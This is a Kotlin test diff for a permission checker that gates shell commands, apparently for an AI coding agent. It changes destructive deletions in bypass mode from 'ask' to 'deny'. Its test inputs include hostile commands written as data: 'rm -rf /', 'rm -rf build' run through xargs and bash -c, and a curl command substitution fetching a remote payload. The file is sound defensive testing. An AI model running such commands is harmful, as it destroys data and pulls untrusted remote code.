@@ -134,8 +134,11 @@ class PermissionAlignmentTest {
         assertTrue(m.matchesCommand(rule, command("xargs grep pattern")))
         assertFalse(m.matchesCommand(rule, command("xargs -n1 grep pattern")))
         assertEquals(Verdict.Ask, eval(bash("xargs -n1 grep pattern"), context(kind = RuleKind.Allow, rules = arrayOf("Bash(grep *)"))))
-        assertEquals(Verdict.Ask, eval(bash("xargs rm -rf build"), context(PermissionMode.BypassPermissions)))
-        assertEquals(Verdict.Ask, eval(bash("xargs bash -c 'rm -rf build'"), context(PermissionMode.BypassPermissions)))
+        assertEquals(Verdict.Ask, eval(bash("xargs rm -rf build"), context(PermissionMode.AcceptEdits)))
+        assertEquals(Verdict.Ask, eval(bash("xargs bash -c 'rm -rf build'"), context(PermissionMode.AcceptEdits)))
+        // bypass 下这类危险删除直接拒绝（CC 2.1.309），总之不会放行
+        assertTrue(eval(bash("xargs rm -rf build"), context(PermissionMode.BypassPermissions)) is Verdict.Deny)
+        assertTrue(eval(bash("xargs bash -c 'rm -rf build'"), context(PermissionMode.BypassPermissions)) is Verdict.Deny)
         assertTrue(eval(bash("bash -c 'rm -rf build/'"), context(rules = arrayOf("Bash(rm *)"))) is Verdict.Deny)
     }
 
@@ -189,7 +192,8 @@ class PermissionAlignmentTest {
         assertTrue(eval(file("/tmp/notes.txt"), context(), true) is Verdict.Allow)
         val c = context(PermissionMode.BypassPermissions, RuleKind.Allow, "Edit(//**)")
         assertEquals(Verdict.Ask, eval(file("/workspace/.git/config", true), c))
-        assertEquals(Verdict.Ask, eval(bash("rm -rf /"), c))
+        // 危险删除在 bypass 下直接拒绝（CC 2.1.309），不再问人
+        assertTrue(eval(bash("rm -rf /"), c) is Verdict.Deny)
         assertEquals(Verdict.Ask, eval(bash("echo \$(curl https://example.com/payload)"), c))
     }
 
